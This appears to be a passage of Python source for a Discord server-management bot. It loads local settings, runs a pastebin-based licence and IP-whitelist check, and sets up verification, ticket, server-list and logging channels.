import os
import asyncio
import discord
from discord.ext import commands
import datetime
import requests as rq
import time
from discord import ui
import tracemalloc
import colorama
from colorama import Fore
import fivem_client
import random
from discord.ui import text_input
from discord.ext import tasks
import requests
from PIL import Image
from datetime import datetime, timedelta, timezone
import sys
import json
from ferrariextools import filetool

trueorfalse = True

while trueorfalse == True:
    try:
        discordlink = filetool.GetPastebin(Link="https://pastebin.com/raw/07nZV6Bv", type=str)
        discordidd = filetool.GetPastebin(Link="https://pastebin.com/raw/15fHmG31", type=str)
        ip = filetool.get_ip()
        discordid = int(discordidd)

        #print(whitelistip)
        wh = filetool.whitelistip("https://pastebin.com/raw/4zc2E6Vf")
        print(f"Welcome: {ip}, {len(wh)} Whitelisted")
        trueorfalse = False
        break
    except:
        os.system("cls")
        pass

style = '''
<!DOCTYPE html>
<html>
<head>
<style>
    body {
        background-color: #1e1e24;
        margin: 10px 0 0 0; /* Changed margin-top to 10px */
        padding: 0;
        font-family: "Roboto", sans-serif;
    }
    .chat-container {
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
    }
    .chat-header {
        text-align: center;
        margin-bottom: 20px;
    }
    .chat-title {
        font-size: 36px;
        color: #fff;
        margin: 0;
    }
    .chat-description {
        color: #8e8ea1;
        font-size: 18px;
        margin-top: 10px;
    }
    .message {
        background-color: #292a31;
        border-radius: 15px;
        margin: 10px 0;
        padding: 15px;
        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
        animation: fadeIn 0.5s ease-in-out;
    }
    .timestamp {
        color: #72767d;
        font-size: 12px;
    }
    .author {
        font-weight: bold;
        color: #8e8ea1;
        margin-right: 10px;
    }
    .content {
        color: #ccc;
        font-size: 16px;
        line-height: 1.4;
        margin-top: 5px;
    }
    .additional-info {
        color: #72767d;
        font-size: 14px;
        margin-top: 20px;
    }
    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(10px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }
</style>
</head>
<body>
'''


os.system("title Discord Bot Panel By Lmao4745")

colorama.init()
if os.path.exists("emojisids\\mod.txt"):
    f = open("emojisids\\mod.txt", "r")
    emojimodu = f.read()
    f.close()

if os.path.exists("emojisids\\verify.txt"):
    f = open("emojisids\\verify.txt", "r")
    emojiverifyu = f.read()
    f.close()
    w = open("systems\\CustomUI\\verify1.txt", "w")
    w.write("")
    w.close()

if os.path.exists("emojisids\\giveaway.txt"):
    f = open("emojisids\\giveaway.txt", "r")
    emojigiveawayu = f.read()
    f.close()

if os.path.exists("emojisids\\banlist.txt"):
    f = open("emojisids\\banlist.txt", "r")
    emojibanlistu = f.read()
    f.close()

if os.path.exists("emojisids\\rbanlist.txt"):
    f = open("emojisids\\rbanlist.txt", "r")
    emojirbanlistu = f.read()
    f.close()








#Bot Update 26/05/2023 -----------------------------------------------------------------------------------------
secupdate = "systems\\security\\"

#Security Update Punishment ----------------
f = open(f"{secupdate}Punishment\\addrole.txt", "r")
Punishmentaddrole = f.read()
f.close()
f = open(f"{secupdate}Punishment\\joinbot.txt", "r")
Punishmentjoinbot = f.read()
f.close()
f = open(f"{secupdate}Punishment\\AntiDeleteChannel.txt", "r")
PunishmentAntiDeleteChannel = f.read()
f.close()
f = open(f"{secupdate}Punishment\\AntiDeleterole.txt", "r")
PunishmentAntiDeleterole = f.read()
f.close()
f = open(f"{secupdate}Punishment\\Antikickmembers.txt", "r")
PunishmentAntikickmembers = f.read()
f.close()
f = open(f"{secupdate}Punishment\\Antibanmembers.txt", "r")
PunishmentAntibanmembers = f.read()
f.close()
f = open(f"{secupdate}Punishment\\CreateChannel.txt", "r")
PunishmentCreateChannel = f.read()
f.close()
f = open(f"{secupdate}Punishment\\CreateRole.txt", "r")
PunishmentCreateRole = f.read()
f.close()
f = open(f"{secupdate}Punishment\\UpChannel.txt", "r")
PunishmentUpChannel = f.read()
f.close()
f = open(f"{secupdate}Punishment\\UpRole.txt", "r")
PunishmentUpRole = f.read()
f.close()
f = open(f"{secupdate}Punishment\\UpServer.txt", "r")
PunishmentUpServer = f.read()
f.close()

serverlogse = open("systems\\logs\\serverlogs.txt", "r")
serverlogsem = serverlogse.read()
serverlogse.close()
#Security Update Reconstruction ----------------
"""
f = open(f"{secupdate}Reconstruction\\Channel.txt", "r")
ReconstructionChannel = f.read()
f.close()
f = open(f"{secupdate}Reconstruction\\Role.txt", "r")
ReconstructionRole = f.read()
f.close()
"""
if os.path.exists(f"systems\\TopPlayers\\true.txt"):
    f = open(f"systems\\TopPlayers\\channel.txt", "r")
    channelspla = int(f.read())
    f.close()

#Server List ---------------------------------------------------------
if os.path.exists("systems\\serverlist-settings\\TVotes\\true.txt"):
    try:
        f = open("systems\\serverlist-settings\\TVotes\\id.txt", "r")
        TRvotes = f.read()
        f.close()
    except:
        pass

getrolessystem = open("systems\\getroles\\egetroles.txt", "r")
getroles_system = getrolessystem.read()
getrolessystem.close()

#Bot Update 26/05/2023 ----------------------------------------------------------------------------------------

file_path = sys.argv[0]


try:
    ticketnumber = 0
    for tic in os.listdir(f"systems\\ticketeditor"):
        ticketnumber += 1
        em = open(f"systems\\ticketeditor\\{tic}\\en.txt", "r")
        tictr = em.read()
        em.close()
        if tictr == "true":
            poticket = f"systems\\ticketeditor\\{tic}"
            if ticketnumber == 1:
                global ticketSname1
                f = open(f"{poticket}\\name.txt", "r", encoding="utf-8")
                ticketSname1 = f.read()
                f.close()
                global ticketSdes1
                d = open(f"{poticket}\\des.txt", "r", encoding="utf-8")
                ticketSdes1 = d.read()
                d.close()
                global ticketSem1
                e = open(f"{poticket}\\em.txt", "r", encoding="utf-8")
                ticketSem1 = e.read()
                e.close()
            if ticketnumber == 2:
                global ticketSname2
                f = open(f"{poticket}\\name.txt", "r", encoding="utf-8")
                ticketSname2 = f.read()
                f.close()
                global ticketSdes2
                d = open(f"{poticket}\\des.txt", "r", encoding="utf-8")
                ticketSdes2 = d.read()
                d.close()
                global ticketSem2
                e = open(f"{poticket}\\em.txt", "r", encoding="utf-8")
                ticketSem2 = e.read()
                e.close()
                global ticketSname21
                f = open(f"{poticket}\\name1.txt", "r", encoding="utf-8")
                ticketSname21 = f.read()
                f.close()
                global ticketSdes21
                d = open(f"{poticket}\\des1.txt", "r", encoding="utf-8")
                ticketSdes21 = d.read()
                d.close()
                global ticketSem21
                e = open(f"{poticket}\\em1.txt", "r", encoding="utf-8")
                ticketSem21 = e.read()
                e.close()
            if ticketnumber == 3:
                global ticketSname3
                f = open(f"{poticket}\\name.txt", "r", encoding="utf-8")
                ticketSname3 = f.read()
                f.close()
                global ticketSdes3
                d = open(f"{poticket}\\des.txt", "r", encoding="utf-8")
                ticketSdes3 = d.read()
                d.close()
                global ticketSem3
                e = open(f"{poticket}\\em.txt", "r", encoding="utf-8")
                ticketSem3 = e.read()
                e.close()
                global ticketSname31
                f = open(f"{poticket}\\name1.txt", "r", encoding="utf-8")
                ticketSname31 = f.read()
                f.close()
                global ticketSdes31
                d = open(f"{poticket}\\des1.txt", "r", encoding="utf-8")
                ticketSdes31 = d.read()
                d.close()
                global ticketSem31
                e = open(f"{poticket}\\em1.txt", "r", encoding="utf-8")
                ticketSem31 = e.read()
                e.close()
                global ticketSname32
                f = open(f"{poticket}\\name2.txt", "r", encoding="utf-8")
                ticketSname32 = f.read()
                f.close()
                global ticketSdes32
                d = open(f"{poticket}\\des2.txt", "r", encoding="utf-8")
                ticketSdes32 = d.read()
                d.close()
                global ticketSem32
                e = open(f"{poticket}\\em2.txt", "r", encoding="utf-8")
                ticketSem32 = e.read()
                e.close()
                #--------------------------------------
            if ticketnumber == 4:
                global ticketSname4
                f = open(f"{poticket}\\name.txt", "r", encoding="utf-8")
                ticketSname4 = f.read()
                f.close()
                global ticketSdes4
                d = open(f"{poticket}\\des.txt", "r", encoding="utf-8")
                ticketSdes4 = d.read()
                d.close()
                global ticketSem4
                e = open(f"{poticket}\\em.txt", "r", encoding="utf-8")
                ticketSem4 = e.read()
                e.close()
                global ticketSname41
                f = open(f"{poticket}\\name1.txt", "r", encoding="utf-8")
                ticketSname41 = f.read()
                f.close()
                global ticketSdes41
                d = open(f"{poticket}\\des1.txt", "r", encoding="utf-8")
                ticketSdes41 = d.read()
                d.close()
                global ticketSem41
                e = open(f"{poticket}\\em1.txt", "r", encoding="utf-8")
                ticketSem41 = e.read()
                e.close()
                global ticketSname42
                f = open(f"{poticket}\\name2.txt", "r", encoding="utf-8")
                ticketSname42 = f.read()
                f.close()
                global ticketSdes42
                d = open(f"{poticket}\\des2.txt", "r", encoding="utf-8")
                ticketSdes42 = d.read()
                d.close()
                global ticketSem42
                e = open(f"{poticket}\\em2.txt", "r", encoding="utf-8")
                ticketSem42 = e.read()
                e.close()
                global ticketSname43
                f = open(f"{poticket}\\name3.txt", "r", encoding="utf-8")
                ticketSname43 = f.read()
                f.close()
                global ticketSdes43
                d = open(f"{poticket}\\des3.txt", "r", encoding="utf-8")
                ticketSdes43 = d.read()
                d.close()
                global ticketSem43
                e = open(f"{poticket}\\em3.txt", "r", encoding="utf-8")
                ticketSem43 = e.read()
                e.close()
                #-----------------------------------------------------------
            if ticketnumber == 5:
                global ticketSname5
                f = open(f"{poticket}\\name.txt", "r", encoding="utf-8")
                ticketSname5 = f.read()
                f.close()
                global ticketSdes5
                d = open(f"{poticket}\\des.txt", "r", encoding="utf-8")
                ticketSdes5 = d.read()
                d.close()
                global ticketSem5
                e = open(f"{poticket}\\em.txt", "r", encoding="utf-8")
                ticketSem5 = e.read()
                e.close()
                global ticketSname51
                f = open(f"{poticket}\\name1.txt", "r", encoding="utf-8")
                ticketSname51 = f.read()
                f.close()
                global ticketSdes51
                d = open(f"{poticket}\\des1.txt", "r", encoding="utf-8")
                ticketSdes51 = d.read()
                d.close()
                global ticketSem51
                e = open(f"{poticket}\\em1.txt", "r", encoding="utf-8")
                ticketSem51 = e.read()
                e.close()
                global ticketSname52
                f = open(f"{poticket}\\name2.txt", "r", encoding="utf-8")
                ticketSname52 = f.read()
                f.close()
                global ticketSdes52
                d = open(f"{poticket}\\des2.txt", "r", encoding="utf-8")
                ticketSdes52 = d.read()
                d.close()
                global ticketSem52
                e = open(f"{poticket}\\em2.txt", "r", encoding="utf-8")
                ticketSem52 = e.read()
                e.close()
                global ticketSname53
                f = open(f"{poticket}\\name3.txt", "r", encoding="utf-8")
                ticketSname53 = f.read()
                f.close()
                global ticketSdes53
                d = open(f"{poticket}\\des3.txt", "r", encoding="utf-8")
                ticketSdes53 = d.read()
                d.close()
                global ticketSem53
                e = open(f"{poticket}\\em3.txt", "r", encoding="utf-8")
                ticketSem53 = e.read()
                e.close()
                global ticketSname54
                f = open(f"{poticket}\\name4.txt", "r", encoding="utf-8")
                ticketSname54 = f.read()
                f.close()
                global ticketSdes54
                d = open(f"{poticket}\\des4.txt", "r", encoding="utf-8")
                ticketSdes54 = d.read()
                d.close()
                global ticketSem54
                e = open(f"{poticket}\\em4.txt", "r", encoding="utf-8")
                ticketSem54 = e.read()
                e.close()
            break
except:
    print("Error")


#--------------------------------------------------------
#Security reconstruction


#--------------------------------------------------------

serlist = open(f"systems\\serverlist-settings\\serverlist.txt", "r")
serverlist = serlist.read()
serlist.close()


f = open("bottoken.txt", "r")
bottokenn = f.read()
f.close()
try:
    os.system("attrib -h -s bottoken.txt")
except:
    pass
bottoken = bottokenn

one_month_ago = datetime.utcnow() - timedelta(days=30)

token = f"{bottoken}"
accountlink = "https://pastebin.com/raw/6gGc8Ctj"

glist = []
Listserverlist = []
Listserverlistt = []
try:
    botprefix = open("botsettings\\botprefix.txt", "r")
    bot_prefix = botprefix.read()
    botprefix.close()
except:
    print(f"Bot Prefix Error\nThe bot prefix is not configured")
try:
    rguild = open("systems\\guild\\guildid.txt", "r")
    guildid = int(rguild.read())
    rguild.close()
except:
    print(f"Guild id Error\nThe Guild id is not configured")
try:
    servern = open("systems\\server\\servername.txt", "r")
    servername = servern.read()
    servern.close()
except:
    print(f"Server Name Error\nThe Server Name is not configured")
try:
    serverc = open("systems\\server\\servericon.txt", "r")
    servericon = serverc.read()
    serverc.close()
except:
    print(f"Server Icon Error\nThe Server Icon is not configured")
try:
    embed = open("systems\\embed\\description.txt", "r")
    embedread = embed.read()
    embed.close()
except:
    print(f"Server description Error\nThe Server description is not configured")
try:
    embedc = open("systems\\embed\\embedcolor.txt", "r")
    embedcread = embedc.read()
    embedc.close()
except:
    print(f"Embed Color Error\nThe code of the color must work according to the basic syntax for example: 0xff0000")
try:
    fivemsystem = open("systems\\fivemsystem\\efivemsystem.txt", "r")
    fivemsystems = fivemsystem.read()
    fivemsystem.close()
except:
    pass
try:
    giveawaye = open("systems\\giveaways\\egiveaways.txt", "r")
    giveawayem = giveawaye.read()
    giveawaye.close()
except:
    pass
try:
    getroleverify = open("systems\\verify\\getrole.verify.txt", "r")
    getroleverifyid = int(getroleverify.read())
    getroleverify.close()
except:
    print(f"Verify Role Error\nThe Verify Role is not configured")
try:
    colorembed = int(embedcread, 16)
except:
    print(f"Embed Color Error\nThe code of the color must work according to the basic syntax for example: 0xff0000")
try:
    securitypermm = open("systems\\security\\securityperm-member.txt", "r")
    securitypermid = int(securitypermm.read())
    securitypermm.close()
except:
    print(f"Security Permissions Error\nThe server's security manager is not configured")
try:
    r = open("systems\\ticket\\ticket-staff-role-id.txt", "r")
    rolestaff = int(r.read())
    r.close()
except:
    print(f"Ticket Staff Role id is not configured")
try:
    serverlistroler = open(f"systems\\serverlist-settings\\staffroleid.txt", "r")
    serverlistrole = int(serverlistroler.read())
    serverlistroler.close()
except:
    pass

try:
    ticket_staffc = open("systems\\ticket\\closeticketperm.txt", "r")
    ticket_staff_rolec = int(ticket_staffc.read())
    ticket_staffc.close()
except:
    pass

#Top Claims -------------------------------------------------------------------
claimtop5r = open("systems\\ticket\\claim.txt", "r")
claimtop5 = claimtop5r.read()
claimtop5r.close()
if claimtop5 == "true":
    try:
        claimchannelr = open("systems\\ticket\\claim-channel.txt", "r")
        claimchannel = int(claimchannelr.read())
        claimchannelr.close()
    except:
        print(f"Claim Channel Error\nThe Claim Channel is not configured")

# define bot
# BOT IS START ........................
class Bot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=f"{bot_prefix}", intents=discord.Intents.all())
resp = requests.get(accountlink)
result = resp.text.split()
if result != ['1.0']:
    os.system("TASKKILL /F /PID %s" % os.getpid() + "& exit")
if result == ['1.0']:
    print("hi")
bot = Bot()
tree = bot.tree
bot.readyr = True
@bot.event
async def on_ready():
    print(ticketnumber)
    tracemalloc.start()
    os.system("cls")
    bot.remove_command("help")
    # VERIFY SYSTEM STARTING ........................
    verifysystem = open("systems\\verify\\everify.txt", "r")
    verify_system = verifysystem.read()
    verifysystem.close()
    global guild
    guild = bot.get_guild(guildid)
    categorylogs = discord.utils.get(guild.categories, name="〈⚙〉management-category")
    if categorylogs:
        print(f"{Fore.LIGHTCYAN_EX}category logs exists {Fore.WHITE}")
    if not categorylogs:
        await guild.create_category(name="〈⚙〉management-category")
        print(f"{Fore.LIGHTCYAN_EX}category logs Created {Fore.WHITE}")
    global categorylogss
    categorylogss = discord.utils.get(guild.categories, name="〈⚙〉management-category")

    if os.path.exists("systems\\security\\true.txt"):
        seclogsc = discord.utils.get(guild.channels, name="〈👁〉security-logs")
        if seclogsc:
            print(f"{Fore.LIGHTCYAN_EX}Security logs exists {Fore.WHITE}")
        if not seclogsc:
            seclchannel = await guild.create_text_channel(name="〈👁〉security-logs", category=categorylogss)
            await seclchannel.set_permissions(guild.default_role, view_channel=False)
            print(f"{Fore.LIGHTCYAN_EX}Security logs Created {Fore.WHITE}")
        global securitylogs
        securitylogs = discord.utils.get(guild.channels, name="〈👁〉security-logs")

    if serverlogsem == "true":
        serverlogss = discord.utils.get(guild.channels, name="〈👁〉server-logs")
        if serverlogss:
            print(f"{Fore.LIGHTCYAN_EX}Server logs exists {Fore.WHITE}")
        if not serverlogss:
            seclchannel = await guild.create_text_channel(name="〈👁〉server-logs", category=categorylogss)
            await seclchannel.set_permissions(guild.default_role, view_channel=False)
            print(f"{Fore.LIGHTCYAN_EX}Server logs Created {Fore.WHITE}")
        global serverlogs
        serverlogs = discord.utils.get(guild.channels, name="〈👁〉server-logs")

    if sendlinkm == "true":
        sendlinkperm = discord.utils.get(guild.roles, name="〈🔧〉sendlink")
        if not sendlinkperm:
            await guild.create_role(name="〈🔧〉sendlink")
            print(f"{Fore.LIGHTCYAN_EX}Send Link perm Role is Created{Fore.WHITE}")
        if sendlinkperm:
            print(f"{Fore.LIGHTCYAN_EX}Send Link perm Role is Exists{Fore.WHITE}")
        global sendlinkpermRole
        sendlinkpermRole = discord.utils.get(guild.roles, name="〈🔧〉sendlink")

    
    if spamming == "true":
        spammingperm = discord.utils.get(guild.roles, name="〈🔧〉spamperm")
        if not spammingperm:
            await guild.create_role(name="〈🔧〉spamperm")
            print(f"{Fore.LIGHTCYAN_EX}Spam perm Role is Created{Fore.WHITE}")
        if spammingperm:
            print(f"{Fore.LIGHTCYAN_EX}Spam perm Role is Exists{Fore.WHITE}")
        global spammingpermrole
        spammingpermrole = discord.utils.get(guild.roles, name="〈🔧〉spamperm")



    Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")
    if Imagem:
        pass
    if not Imagem:
        Imagem =  await guild.create_text_channel(name="〈💍〉bot-messages", category=categorylogss)
        await Imagem.set_permissions(guild.default_role, view_channel=False, send_messages=False)
    Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")


    if not os.path.exists("emojisids\\verify.txt"):
        if verify_system == "true":
            try:
                verify_channel = open(f"systems\\verify\\channel.txt", "r")
                verify_channell = int(verify_channel.read())
                verify_channel.close()
                verifych = discord.utils.get(guild.channels, id=verify_channell)
                embed=discord.Embed(title="Bot Verify", description="**To verify yourself click the button**", color=0x00ff89)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            except:
                verifych = discord.utils.get(guild.channels, name="〈✅〉verify")
                if verifych:
                    embed=discord.Embed(title="Bot Verify", description="**To verify yourself click the button**", color=0x00ff89)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                if not verifych:
                    verifych = await guild.create_text_channel(name="〈✅〉verify")
                    verifych = discord.utils.get(guild.channels, name="〈✅〉verify")
                    role = discord.utils.get(guild.roles, id=getroleverifyid)
                    await verifych.set_permissions(guild.default_role, view_channel=True, send_messages=False)
                    await verifych.set_permissions(role, view_channel=False, send_messages=False)
                    guild = bot.get_guild(guildid)
                    embed=discord.Embed(title="Bot Verify", description="**To verify yourself click the button**", color=0x00ff89)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await verifych.purge()
            await verifych.send(embed=embed, view=Verify1())
            print(Fore.GREEN + "Verify loaded" + Fore.WHITE)
        if verify_system == "false":
            print(Fore.RED + "Verify System is Disabled" + Fore.WHITE)
    if os.path.exists("emojisids\\verify.txt"):
        image_path = "emojis\\1446-green-verify.gif"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        if verify_system == "true":
            try:
                f = open("emojisids\\verify.txt", "r")
                emojiverifyu = f.read()
                f.close()
                verify_channel = open(f"systems\\verify\\channel.txt", "r")
                verify_channell = int(verify_channel.read())
                verify_channel.close()
                verifych = discord.utils.get(guild.channels, id=verify_channell)
                embed=discord.Embed(title=f"{emojiverifyu} The authentication system", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**User authentication system for server security**", color=0x00ff89)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{image_link}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            except:
                verifych = discord.utils.get(guild.channels, name="〈✅〉verify")
                if verifych:
                    embed=discord.Embed(title=f"{emojiverifyu} The authentication system", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**User authentication system for server security**", color=0x00ff89)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{image_link}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                if not verifych:
                    verifych = await guild.create_text_channel(name="〈✅〉verify")
                    verifych = discord.utils.get(guild.channels, name="〈✅〉verify")
                    role = discord.utils.get(guild.roles, id=getroleverifyid)
                    await verifych.set_permissions(guild.default_role, view_channel=True, send_messages=False)
                    await verifych.set_permissions(role, view_channel=False, send_messages=False)
                    guild = bot.get_guild(guildid)
                    embed=discord.Embed(title=f"{emojiverifyu} The authentication system", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**User authentication system for server security**", color=0x00ff89)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{image_link}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await verifych.purge()
            await verifych.send(embed=embed, view=Verify1())
            print(Fore.GREEN + "Verify loaded" + Fore.WHITE)
        if verify_system == "false":
            print(Fore.RED + "Verify System is Disabled" + Fore.WHITE)




    # TICKET SYSTEM STARTING ........................
    ticketsystem = open("systems\\ticket\\eticket.txt", "r")
    ticket_system = ticketsystem.read()
    ticketsystem.close()
    if ticket_system == "true":
        try:
            channelticket = open("systems\\ticket\\channel.txt", "r")
            channeltickett = int(channelticket.read())
            channelticket.close()
            ticketch = discord.utils.get(guild.channels, id=channeltickett)
            if ticketch:
                await ticketch.purge()
                embed=discord.Embed(title="Ticket Tool", description="**Ticket system\nClick to open a ticket**", color=colorembed)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                await ticketch.send(embed=embed, view=Ticket())
        except:
            channeltickett = ""
        if channeltickett == "":
            try:
                ticketch = discord.utils.get(guild.channels, name="〈📩〉ticket")
                if ticketch is not None:
                    pass
                else:
                    ticketch = discord.utils.get(guild.channels, name="〈📩〉ticket")
            except:
                ticketch = discord.utils.get(guild.channels, name="〈📩〉ticket")
            if ticketch:
                await ticketch.purge()
                embed=discord.Embed(title="Ticket Tool", description="**Ticket system\nClick to open a ticket**", color=colorembed)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                await ticketch.send(embed=embed, view=Ticket())
            if not ticketch:
                await guild.create_text_channel(name="〈📩〉ticket")
                ticketch = discord.utils.get(guild.channels, name="〈📩〉ticket")
                await ticketch.set_permissions(guild.default_role, view_channel=False, send_messages=False)
                try:
                    await ticketch.set_permissions(role, view_channel=True, send_messages=False)
                except:
                    print(f"{Fore.LIGHTYELLOW_EX}The role is not defined{Fore.WHITE}")
                embed=discord.Embed(title="Ticket Tool", description="**Ticket system\nClick to open a ticket**", color=colorembed)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                await ticketch.send(embed=embed, view=Ticket())
            if ticketchlog:
                pass



        
        ticketchlog = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
        if not ticketchlog:
            await guild.create_text_channel(name=f"〈📋〉ticketlogs", category=categorylogss)
            ticketchlog = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
            await ticketchlog.set_permissions(guild.default_role, read_messages=False, send_messages=False)   
        print(Fore.GREEN + "Ticket loaded" + Fore.WHITE)
    if ticket_system == "false":
        print(Fore.RED + "Ticket System is Disabled"  + Fore.WHITE)

    
    if serverlist == "true":
        serverlistchannel = discord.utils.get(guild.channels, name=f"〈📝〉server-list-panel")
        image_path = "emojis\\2366-discord-developers.gif"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        if serverlistchannel:
            await serverlistchannel.purge()
            embeds=discord.Embed(title=f"📝 ServerList Administrator Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__Management panel for a list of servers and full control__**", color=0x0005ff)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await serverlistchannel.send(embed=embeds, view=serverlistt())
        if not serverlistchannel:
            await guild.create_text_channel(name=f"〈📝〉server-list-panel", category=categorylogss)
            serverlistchannel = discord.utils.get(guild.channels, name=f"〈📝〉server-list-panel")
            embeds=discord.Embed(title=f"📝 ServerList Administrator Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__Management panel for a list of servers and full control__**", color=0x0005ff)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await serverlistchannel.send(embed=embeds, view=serverlistt())
        for folder in os.listdir("systems\\serverlist"):
            p = f"systems\\serverlist\\{folder}"
            f = open(f"{p}\\channel.txt", "r", encoding="utf-8")
            cid = int(f.read())
            f.close()
            f = open(f"{p}\\serverlistname.txt", "r", encoding="utf-8")
            serverlistname = f.read()
            f.close()
            f = open(f"{p}\\serverlistdes.txt", "r", encoding="utf-8")
            serverlistdes = f.read()
            f.close()
            f = open(f"{p}\\serverlisticon.txt", "r", encoding="utf-8")
            serverlisticon = f.read()
            f.close()
            f = open(f"{p}\\serverlink.txt", "r", encoding="utf-8")
            serverlink = f.read()
            f.close()
            f = open(f"{p}\\{folder}.txt", "r", encoding="utf-8")
            votes = f.read()
            f.close()
            f = open(f"{p}\\serverowner.txt", "r", encoding="utf-8")
            owner = f.read()
            f.close()
            channelList = discord.utils.get(guild.channels, id=cid)
            #Server List --------------------------------------
            embed=discord.Embed(title=f"{serverlistname}", description=f"{serverlistdes}", color=discord.Colour.random())
            embed.set_thumbnail(url=f"{serverlisticon}")
            if "false" != owner:
                try:
                    ownerr = int(owner)
                    member = guild.get_member(ownerr)
                    embed.add_field(name=f"Server Link:", value=f"[Click Here]({serverlink})", inline=True)
                    embed.add_field(name=f"Server Owner: ", value=f"``{member.name}#{member.discriminator}``", inline=True)
                    embed.add_field(name=f"Votes: ", value=f"``{votes}``", inline=True)
                except:
                    embed.add_field(name=f"Server Link", value=f"[Click Here]({serverlink})", inline=True)
                    embed.add_field(name=f"Votes", value=f"{votes}", inline=True)
            else:
                embed.add_field(name=f"Server Link", value=f"[Click Here]({serverlink})", inline=True)
                embed.add_field(name=f"Votes", value=f"{votes}", inline=True)
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            try:
                await channelList.purge()
                await asyncio.sleep(3)
                messageid = await channelList.send(embed=embed, view=serverlistbuttons())
                os.system(f"move {p}\\{folder}.txt {p}\\{messageid.id}.txt")
                os.system(f"move systems\\serverlist\\{folder} systems\\serverlist\\{messageid.id}")
            except:
                print("The room does not exist")
        if not serverlistf.is_running():
            serverlistf.start()
        if os.path.exists("systems\\serverlist-settings\\TVotes\\true.txt"):
            if not serverlistf2.is_running():
                serverlistf2.start()
        if os.path.exists("systems\\serverlist-settings\\AutoDelete.txt"):
            if not serverlistf3.is_running():
                serverlistf3.start()
        print(Fore.GREEN + "Server List loaded" + Fore.WHITE)



    if claimtop5 == "true":
        topclaims.start()
        po = f"systems\\ticket"
        number = 0
        embed=discord.Embed(title="Top 5 Claims", description="**The top 5 staff members, who claimed most tickets**", color=discord.Colour.random())
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        directory = f'{po}\\claims'
        data = []

        for filename in os.listdir(directory):
            if os.path.isfile(os.path.join(directory + "\\", filename)):
                with open(os.path.join(directory + "\\", filename), 'r') as file:
                    numbers = [int(line.strip()) for line in file]
                    max_num = max(numbers)

                data.append((filename, max_num))


        data.sort(key=lambda x: x[1], reverse=True)

        for filename, max_num in data[:5]:
            number += 1
            number = str(number)
            username = filename.split('.')[0]
            member = guild.get_member(int(username))
            if member is not None:
                if number == "1" or number == 1:
                    embed.add_field(name=f"Top #{number}", value=f"``🥇`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
                elif number == "2" or number == 2:
                    embed.add_field(name=f"Top #{number}", value=f"``🥈`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
                elif number == "3" or number == 3:
                    embed.add_field(name=f"Top #{number}", value=f"``🥉`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
                else:
